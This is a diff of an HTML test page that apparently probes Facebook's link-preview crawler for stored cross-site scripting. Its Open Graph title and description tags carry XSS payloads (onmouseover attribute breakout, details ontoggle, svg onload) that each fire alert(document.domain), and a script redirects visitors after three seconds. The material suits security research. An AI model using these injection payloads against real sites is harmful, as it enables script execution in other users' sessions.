@@ -6,23 +6,27 @@
     
     <meta property="og:url" content="https://xsstestfb.vercel.app/">
     <meta property="og:type" content="website">
-    <meta property="og:title" content="Verified Content &#x3c;svg/onload=alert(document.domain)&#x3e;">
-    <meta property="og:description" content="This is a secure educational preview for bug hunting research.">
+    <meta property="og:title" content='Verified Security Research " onmouseover="alert(document.domain)" '>
+    <meta property="og:description" content="<details/open/ontoggle=alert(document.domain)> Click to view secure report.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
     <meta property="fb:app_id" content="966242223397117">
 
-    <title>Educational Research - hasn0x</title>
+    <title>XSS Research - hasn0x</title>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
-        <h1>Security Research in Progress...</h1>
-        <p>Redirecting to the official source soon.</p>
+    <div style="text-align: center; margin-top: 100px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
+        <h1 style="color: #1877f2;">Facebook Link Preview Test</h1>
+        <p>Researching Stored XSS in Link Metadata...</p>
+        <div id="target" style="padding: 20px; border: 1px solid #ddd; display: inline-block;">
+            Please wait while we verify the link preview.
+        </div>
     </div>
 
     <script>
-        // ৩ সেকেন্ড পর রিডাইরেক্ট হবে যাতে ফেসবুক ক্রলার ডাটা রিড করার সময় পায়
+        // ৩ সেকেন্ড পর অটো রিডাইরেক্ট (ক্রলারকে ডাটা রিড করার সুযোগ দেয়)
         setTimeout(function() {
-            window.location.href = "https://www.youtube.com";
+            console.log("Redirecting for security check...");
+            window.location.href = "https://www.facebook.com/security";
         }, 3000);
     </script>
 </body>
